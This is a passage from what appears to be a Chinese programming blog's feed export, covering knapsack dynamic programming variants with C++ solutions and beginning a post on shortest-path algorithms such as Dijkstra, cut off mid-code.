&#123;</span><br><span class="line">                <span class="keyword">if</span> (volume[l] &lt;= j) &#123;</span><br><span class="line">                    dp[j] = max(dp[j], dp[j - volume[l]] + value[l]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v;</span><br><span class="line">    group_park(n, v);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; dp[v]&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h2><p>分组的背包问题将彼此互斥的若干物品称为一个组，这建立了一个很好的模型。不少背包问题的变形都可以转化为分组的背包问题（例如P07），由分组的背包问题进一步可定义“泛化物品”的概念，十分有利于解题。</p><h2 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="acwing.com/problem/content/9/">acwing模板题——分组背包问题</a></li><li><a href="https://ac.nowcoder.com/acm/problem/14602" target="_blank" rel="noopener">牛客——xinjun与阴阳师</a></li></ol><h1 id="P07-有依赖的背包问题"><a href="#P07-有依赖的背包问题" class="headerlink" title="* P07: 有依赖的背包问题"></a>* P07: 有依赖的背包问题</h1><h2 id="简化的问题"><a href="#简化的问题" class="headerlink" title="简化的问题"></a>简化的问题</h2><p>这种背包问题的物品间存在某种“依赖”的关系。也就是说，$i$依赖于$j$，表示若选物品$i$，则必须选物品$j$。为了简化起见，我们先设没有某个物品既依赖于别的物品，又被别的物品所依赖；另外，没有某件物品同时依赖多件物品。</p><h2 id="算法-2"><a href="#算法-2" class="headerlink" title="算法"></a>算法</h2><p>这个问题由NOIP2006金明的预算方案一题扩展而来。遵从该题的提法，将不依赖于别的物品的物品称为“主件”，依赖于某主件的物品称为“附件”。由这个问题的简化条件可知所有的物品由若干主件和依赖于每个主件的一个附件集合组成。</p><p>按照背包问题的一般思路，仅考虑一个主件和它的附件集合。可是，可用的策略非常多，包括：一个也不选，仅选择主件，选择主件后再选择一个附件，选择主件后再选择两个附件……无法用状态转移方程来表示如此多的策略。（事实上，设有$n$个附件，则策略有$2^n+1$个，为指数级）</p><p>考虑到所有这些策略都是互斥的（也就是说，你只能选择一种策略），所以一个主件和它的附件集合实际上对应于 P06 中的一个物品组，每个选择了主件又选择了若干个附件的策略对应于这个物品组中的一个物品，其费用和价值都是这个策略中的物品的值的和。但仅仅是这一步转化并不能给出一个好的算法，因为物品组中的物品还是像原问题的策略一样多。</p><p>再考虑P06中的一句话： <em>可以对每组中的物品应用P02中“一个简单有效的优化”</em>。 这提示我们，对于一个物品组中的物品，所有费用相同的物品只留一个价值最大的，不影响结果。所以，我们可以对主件$i$的“附件集合”先进行一次01背包，得到费用依次为$0..V-c[i]$所有这些值时相应的最大价值$f’[0..V-c[i]]$。那么这个主件及它的附件集合相当于$V-c[i]+1$个物品的物品组，其中费用为$c[i]+k$的物品的价值为$f’[k]+w[i]$。也就是说原来指数级的策略中有很多策略都是冗余的，通过一次01背包后，将主件$i$转化为$V-c[i]+1$个物品的物品组，就可以直接应用P06的算法解决问题了。</p><h2 id="较一般的问题"><a href="#较一般的问题" class="headerlink" title="较一般的问题"></a>较一般的问题</h2><p>更一般的问题是：依赖关系以图论中“森林”的形式给出（森林即多叉树的集合），也就是说，主件的附件仍然可以具有自己的附件集合，限制只是每个物品最多只依赖于一个物品（只有一个主件）且不出现循环依赖。</p><p>解决这个问题仍然可以用将每个主件及其附件集合转化为物品组的方式。唯一不同的是，由于附件可能还有附件，就不能将每个附件都看作一个一般的01背包中的物品了。若这个附件也有附件集合，则它必定要被先转化为物品组，然后用分组的背包问题解出主件及其附件集合所对应的附件组中各个费用的附件所对应的价值。</p><p>事实上，这是一种树形DP，其特点是每个父节点都需要对它的各个儿子的属性进行一次DP以求得自己的相关属性。这已经触及到了“泛化物品”的思想。看完P08后，你会发现这个“依赖关系树”每一个子树都等价于一件泛化物品，求某节点为根的子树对应的泛化物品相当于求其所有儿子的对应的泛化物品之和。</p><h2 id="具体思路"><a href="#具体思路" class="headerlink" title="具体思路"></a>具体思路</h2><p>dfs在遍历到 $x$ 结点时，先考虑一定选上根节点 $x$ ，因此初始化 $f[x][v[x]…m] = w[x]$<br>在分组背包部分：<br>$j$ 的范围 $[ m , v[x] ] $小于$v[x]$则没有意义因为连根结点都放不下；<br>$k$的范围$ [ 0 , j-v[x] ]$，当大于$j-v[x]$时分给该子树的容量过多，剩余的容量连根节点的物品都放不下了；</p><h2 id="代码实现-5"><a href="#代码实现-5" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e2</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxn][maxv];<span class="comment">//dp[x][v]表达选择以x为子树的物品，在容量不超过v时所获得的最大价值</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tree[maxn];<span class="comment">//树，存放依赖关系</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn];<span class="comment">//每个物品的体积和价值</span></span><br><span class="line"><span class="keyword">int</span> n, v, root;<span class="comment">//总物品数、背包容量、树根结点</span></span><br><span class="line"><span class="comment">//有依赖的背包</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = volume[x]; i &lt;= v; i++) dp[x][i] = value[x];<span class="comment">//点x必须选，所以初始化dp[x][value[x] ~ v]= value[x]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tree[x].size(); i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> son = tree[x][i];</span><br><span class="line">        dfs(son);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = v; j &gt;= volume[x]; j--) &#123;<span class="comment">//j的范围为value[x]~v, 小于value[x]无法选择以x为子树的物品</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= j - volume[x]; k++) &#123;<span class="comment">//分给子树son的空间不能大于j-value[x],不然都无法选根物品x</span></span><br><span class="line">                dp[x][j] = max(dp[x][j], dp[x][j - k] + dp[son][k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> fa;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; value[i]&gt;&gt; fa;</span><br><span class="line">        <span class="keyword">if</span> (fa == <span class="number">-1</span>)</span><br><span class="line">            root = i;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            tree[fa].push_back(i);</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; dp[root][v];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h2><p>NOIP2006的那道背包问题我做得很失败，写了上百行的代码，却一分未得。后来我通过思考发现通过引入“物品组”和“依赖”的概念可以加深对这题的理解，还可以解决它的推广问题。用物品组的思想考虑那题中极其特殊的依赖关系：物品不能既作主件又作附件，每个主件最多有两个附件，可以发现一个主件和它的两个附件等价于一个由四个物品组成的物品组，这便揭示了问题的某种本质。</p><p>我想说：失败不是什么丢人的事情，从失败中全无收获才是。</p><h2 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="https://www.acwing.com/problem/content/10/" target="_blank" rel="noopener">acwing模板题——有依赖的背包问题</a></li></ol><h1 id="P08-泛化物品"><a href="#P08-泛化物品" class="headerlink" title="* P08: 泛化物品"></a>* P08: 泛化物品</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><h2 id="算法-3"><a href="#算法-3" class="headerlink" title="算法"></a>算法</h2><h2 id="代码实现-6"><a href="#代码实现-6" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h2><h2 id="练习-7"><a href="#练习-7" class="headerlink" title="练习"></a>练习</h2><h1 id="P09-背包问题问法的变化"><a href="#P09-背包问题问法的变化" class="headerlink" title="P09: 背包问题问法的变化"></a>P09: 背包问题问法的变化</h1><h2 id="输出方案"><a href="#输出方案" class="headerlink" title="输出方案"></a>输出方案</h2><h2 id="输出字典序最小的最优方案"><a href="#输出字典序最小的最优方案" class="headerlink" title="输出字典序最小的最优方案"></a>输出字典序最小的最优方案</h2><p>这里“字典序最小”的意思是$1…N$号物品的选择方案排列出来以后字典序最小。以输出01背包最小字典序的方案为例。</p><p>题目要求输出字典序最小的解，假设存在一个包含第1个物品的最优解，为了确保字典序最小那么我们必然要选第一个。那么问题就转化成从$2～N$这些物品中找到最优解。之前的$f(i,j)$记录的都是前$i$个物品总容量为$j$的最优解，那么我们现在将$f(i,j)$定义为从第$i$个元素到最后一个元素总容量为$j$的最优解。接下来考虑状态转移：</p><p>$f(i,j)=max{f(i+1,j),f(i+1,j−v[i])+w[i]}$<br>两种情况，第一种是不选第$i$个物品，那么最优解等同于从第$i+1$个物品到最后一个元素总容量为$j$的最优解；第二种是选了第$i$个物品，那么最优解等于当前物品的价值$w[i]$加上从第$i+1$个物品到最后一个元素总容量为$j−v[i]$的最优解。</p><p>计算完状态表示后，考虑如何的到最小字典序的解。首先$f(1,m)$肯定是最大价值，那么我们便开始考虑能否选取第1个物品呢。</p><p>如果$f(1,m)=f(2,m−v[1])+w[1]$，说明选取了第1个物品可以得到最优解。</p><p>如果$f(1,m)=f(2,m)$，说明不选取第一个物品才能得到最优解。</p><p>如果$f(1,m)=f(2,m)=f(2,m−v[1])+w[1]$，说明选不选都可以得到最优解，但是为了考虑字典序最小，我们也需要选取该物品。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxn][maxv];<span class="comment">//从第i个元素到最后一个元素总容量为j的最优解</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn];<span class="comment">//每个物品的体积和价值</span></span><br><span class="line"><span class="keyword">int</span> n, v;<span class="comment">//总物品数、背包体积</span></span><br><span class="line"><span class="comment">//01背包 每种物品仅有一件，可以选择放或不放</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">optimal_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> vol, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= v; j++) &#123;</span><br><span class="line">        dp[i][j] = dp[i + <span class="number">1</span>][j];</span><br><span class="line">        <span class="keyword">if</span>(j &gt;= vol)</span><br><span class="line">            dp[i][j] = max(dp[i][j], dp[i + <span class="number">1</span>][j - vol] + val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; value[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        optimal_park(value[i], volume[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">int</span> cur_v = v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= n ; i++) &#123;   </span><br><span class="line">        <span class="keyword">if</span> (i == n &amp;&amp; cur_v &gt;= volume[i]) &#123;<span class="comment">//如果是最后一个元素，特判一下，防止越界即可</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt; i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cur_v &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//判断下标是否越界</span></span><br><span class="line">        <span class="keyword">if</span> (cur_v - volume[i]&gt;=<span class="number">0</span> &amp;&amp; dp[i][cur_v] == dp[i + <span class="number">1</span>][cur_v - volume[i]] + value[i]) &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt; i&lt;&lt; <span class="string">" "</span>;</span><br><span class="line">            cur_v = cur_v - volume[i];<span class="comment">//选了第i个物品，剩余容量就要减小。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="求方案总数"><a href="#求方案总数" class="headerlink" title="求方案总数"></a>求方案总数</h2><h2 id="最优方案的总数"><a href="#最优方案的总数" class="headerlink" title="最优方案的总数"></a>最优方案的总数</h2><p>这里的最优方案是指物品总价值最大的方案。以01背包为例。</p><p>时间复杂度 $O(nm)$<br>定义两个数组：$f[maxv]$，$cnt[maxv]$：$f[i]$ 用来存储背包容积为 $i$ 时的最佳方案的总价值，$cnt[i]$为背包容积为 $i$ 时总价值为最佳的方案数。</p><p>先初始化所有的 $cnt[i]$ 为 1，因为背包里什么也不装也是一种方案。</p><p>外层循环 $n$ 次，每次读入新物品的 $v,w$</p><p>求出装新物品时的总价值，与不装新物品时作对比</p><p>如果装新物品的方案总价值更大，那么用 $f[j−v]+w$ 来更新 $f[j]$，用 $cnt[j−v]$ 更新 $cnt[j]$<br>如果总价值相等，那么最大价值的方案数就多了 $cnt[j−v]$ 种。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//物品最大数量</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxv = <span class="number">1e3</span> + <span class="number">5</span>;<span class="comment">//背包最大体积</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod  = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> dp[maxv], cnt[maxv];<span class="comment">//背包，最优方案总数</span></span><br><span class="line"><span class="keyword">int</span> volume[maxn], value[maxn];<span class="comment">//每个物品的体积和价值</span></span><br><span class="line"><span class="keyword">int</span> n, v;<span class="comment">//总物品数、背包体积</span></span><br><span class="line"><span class="comment">//01背包 求解最优方案总数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">optimal_sum_park</span><span class="params">(<span class="keyword">int</span> val, <span class="keyword">int</span> vol)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = v; j &gt;= vol; j--) &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = dp[j - vol] + val;</span><br><span class="line">        <span class="keyword">if</span> (tmp &gt; dp[j]) &#123;</span><br><span class="line">            dp[j] = tmp;</span><br><span class="line">            cnt[j] = cnt[j - vol];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tmp == dp[j]) &#123;</span><br><span class="line">            cnt[j] = (cnt[j] + cnt[j - vol]) % mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; n&gt;&gt; v;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt; volume[i]&gt;&gt; value[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= v; i++) &#123;</span><br><span class="line">        cnt[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        optimal_sum_park(value[i], volume[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; cnt[v]&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h2><p>显然，这里不可能穷尽背包类动态规划问题所有的问法。甚至还存在一类将背包类动态规划问题与其它领域（例如数论、图论）结合起来的问题，在这篇论背包问题的专文中也不会论及。但只要深刻领会前述所有类别的背包问题的思路和状态转移方程，遇到其它的变形问法，只要题目难度还属于NOIP，应该也不难想出算法。</p><p>触类旁通、举一反三，应该也是一个OIer应有的品质吧。</p><h2 id="练习-8"><a href="#练习-8" class="headerlink" title="练习"></a>练习</h2><ol><li><a href="https://www.acwing.com/problem/content/11/" target="_blank" rel="noopener">acwing模板题——背包问题求方案数</a></li><li><a href></a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最短路</title>
      <link href="/2021/04/09/%E6%9C%80%E7%9F%AD%E8%B7%AF/"/>
      <url>/2021/04/09/%E6%9C%80%E7%9F%AD%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>　　最短路问题分为两类：<strong>单源最短路</strong>和<strong>多源最短路</strong>。前者只需要求一个<strong>固定的起点</strong>到各个顶点的最短路径，后者则要求得出<strong>任意两个顶点</strong>之间的最短路径。</p><ul><li><strong>单源 Dijkstra算法</strong>：<ul><li><strong>优点</strong>：时间复杂度稳定$O(n^2)$，堆优化能达到$O(ElogE)$；也可解决多源最短路，总的时间复杂度也是$O(n^3)$</li><li><strong>缺点</strong>：不能处理负边</li></ul></li><li><strong>单源 Bellman-Ford算法</strong>：<ul><li><strong>优点</strong>：其优于Dijkstra算法的方面是边的权值可以为负数、实现简单</li><li><strong>缺点</strong>：时间复杂度过高，高达$O(V*E)$；但算法可以进行若干种优化，提高了效率。</li></ul></li><li><strong>单源 SPFA算法</strong>：<ul><li><strong>优点</strong>：快于Bellman-Ford，据说随机数据下期望时间复杂度是$O(m+nlogn)$</li><li><strong>缺点</strong>：时间复杂度<strong>不稳定</strong>，最坏情况可以被卡成Bellman-Ford，也就是$O(V*E)$</li></ul></li><li><strong>全源 Floyd算法</strong>：<ul><li><strong>优点</strong>：算法简洁，可以解决负权图</li><li><strong>缺点</strong>：时间复杂度为$O(n^3)$，空间复杂度为$O(n^2)$，都比较高，所以只适用于数据规模较小的情形；不能解决负环图</li></ul></li><li><strong>全源 Johnson算法</strong>：<ul><li><strong>优点</strong>：相对于Floyd算法时间复杂度低，$O(nmlogm)$；</li><li><strong>缺点</strong>：无负环图、算法较繁琐</li></ul></li><li><strong>BFS算法</strong>：<ul><li><strong>优点</strong>：</li><li><strong>缺点</strong>：只能解决无权图</li></ul></li></ul><h1 id="1-单源-Dijkstra算法"><a href="#1-单源-Dijkstra算法" class="headerlink" title="1 单源 Dijkstra算法"></a>1 单源 Dijkstra算法</h1><p><strong>贪心</strong>的思想，不断取出<strong>离顶点最近</strong>而<strong>没有被访问过</strong>的点，松弛它和它能到达的所有点。</p><blockquote><p>对于每个顶点v∈V，都设置一个属性d[v]，用来描述从源点s到v的最短路径上权值的上界，称为最短路径估计（shortest-pathestimate）。</p><p>π[v]代表S到v的当前最短路径中v点之前的一个点的编号,我们用下面的Θ(V)时间的过程来对最短路径估计和前趋进行初始化。</p><p>在松弛一条边(u,v)的过程中，要测试是否可以通过u，对迄今找到的v的最短路径进行改进；如果可以改进的话，则更新d[v]和π[v]。一次松弛操作可以减小最短路径估计的值d[v]，并更新v的前趋域$π[v]$(S到v的当前最短路径中v点之前的一个点的编号)。</p></blockquote><p><strong>打印路径</strong>：只需要用一个pre[]数组存储每个点的<strong>父节点</strong>即可。（单源最短路的起点是固定的，所以每条路有且仅有一个祖先节点，一步步溯源上去的路径是唯一的。相反，这里不能存<strong>子节点</strong>，因为从源点下去，有很多条最短路径）</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/96621396" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/96621396</a></p><p><strong>朴素Dijkstra</strong>：时间复杂度是 $O(n^2+m)$, $n$ 表示点数，$m$ 表示边数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">5e2</span> + <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g[maxn][maxn];  <span class="comment">// 存储每条边</span></span><br><span class="line"><span class="keyword">int</span> dist[maxn];  <span class="comment">// 存储1号点到每个点的最短距离</span></span><br><span class="line"><span class="keyword">bool</span> st[maxn];   <span class="comment">// 存储每个点的最短路是否已经确定</span></span><br><span class="line"><span class="keyword">int</span> n;<span class="comment">//点数</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// 求1号点到n号点的最短路，如果不存在则返回-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dijkstra</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dist, <span class="number">0x3f</span>, <span class="keyword">sizeof</span> dist);</span><br><span class="line">    dist[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i ++ ) &#123;</span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">-1</span>;     <span class="comment">// 在还未确定最短路的点中，寻找距离最小的点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            <span class="keyword">if</span> (!st[j] &amp;&amp; (t == <span class="number">-1</span> || dist[t] &gt; dist[j]))</span><br><span class="line">                t = j;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用t更新其他点的距离</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j ++ )</span><br><span class="line">            dist[j] = min(dist[j], dist[t] + g[t][j]);</span><br><span class="line"></span><br><span class="line">        st[t] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dist[n] == <span class="number">0x3f3f3f3f</span>) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> dist[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>堆优化Dijkstra</strong>：时间复杂度 $O(mlogn)$, $n$ 表示点数，$m$ 表示边数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 